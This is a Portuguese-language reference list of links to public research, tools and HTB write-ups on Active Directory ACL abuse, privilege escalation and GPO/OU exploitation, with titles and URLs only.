- [1] [Abuso de ACLs/ACEs do Active Directory](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Contas privilegiadas e privilégios de token](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – A atualização dos caminhos de ataque de ACL](https://wald0.com/?p=112)
- [4] [Enum ActiveDirectoryRights - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Escalonando privilégios com ACLs no Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Verificação de privilégios e contas privilegiadas do Active Directory](https://adsecurity.org/?p=3658)
- [7] [Construtor ActiveDirectoryAccessRule - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – Operações de atributos/UAC do AD no Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (associação a grupos)](https://www.samba.org/)
- [10] [HTB Puppy: abuso de ACL do AD, quebra de Argon2 do KeePassXC e descriptografia de DPAPI até administrador do DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: sequestro de caminhos UNC de GPO para execução de código e NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: explorando GPOs do Active Directory por meio de NTLM Relay e muito mais](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU having a laugh? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: explorando vetores de ataque ACL ocultos de Organizational Units no Active Directory](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Simulando serviços legítimos do Active Directory na rede: o caso da exploração de GPO](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [GPOddity da Synacktiv](https://github.com/synacktiv/GPOddity)
- [17] [OUned da Synacktiv](https://github.com/synacktiv/OUned)
- [18] [HTB: Hercules — movimentação entre OUs e abuso de ACLs herdadas](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
